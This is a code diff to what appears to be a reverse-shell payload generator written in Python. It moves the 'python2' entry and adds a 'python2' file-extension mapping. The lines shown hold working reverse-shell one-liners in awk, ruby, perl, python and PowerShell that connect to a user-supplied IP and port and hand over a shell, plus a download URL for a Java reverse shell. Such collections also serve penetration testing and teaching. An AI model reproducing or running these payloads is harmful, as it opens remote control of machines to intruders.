@@ -74,7 +74,6 @@ url3 = "https://github.com/ElMehdi-Chbani/Reverse-Shells/raw/main/shell.java"
 
 # Define a dictionary for different shell commands
 shell_commands = {
-    "python2": 'export RHOST="%s";export RPORT=%s;python2.7 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
     "awk": 'awk \'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (IP, PORT),
     "ruby": 'ruby -rsocket -e \'spawn("sh",[:in,:out,:err]=>TCPSocket.new("%s",%s))\'' % (IP, PORT),
     "rustcat": "rcat {} {} -r undefined".format(IP, PORT),
@@ -84,6 +83,7 @@ shell_commands = {
     "perl-no-sh": 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (IP, PORT),
     "perl": 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("undefined -i");}};\'' % (IP, PORT),
     "python": 'export RHOST="%s";export RPORT=%s;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
+    "python2": 'export RHOST="%s";export RPORT=%s;python2.7 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
     "python3": 'export RHOST="%s";export RPORT=%s;python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
     "powershell-1": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
     "powershell-2": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
@@ -154,7 +154,7 @@ elif EXTENSION == "python":
     print("  ~) -"+color(" Python         ",(CYAN))+"  ~) - "+color("Python2",(CYAN)))
     print("  ~) -"+color(" Python3         ",(CYAN)))
     print("\n")
-    
+
     EX = prompt("What Python Version are you using: ", completer=completer2).lower()
     EXTENSION = EX
 
@@ -186,6 +186,7 @@ elif EXTENSION == "php":
 # Define a dictionary to map shell formats to file extensions
 format_to_extension = {
     "python3": "sh",
+    "python2": "sh",
     "bash": "sh",
     "perl": "pl",
     "python": "sh",
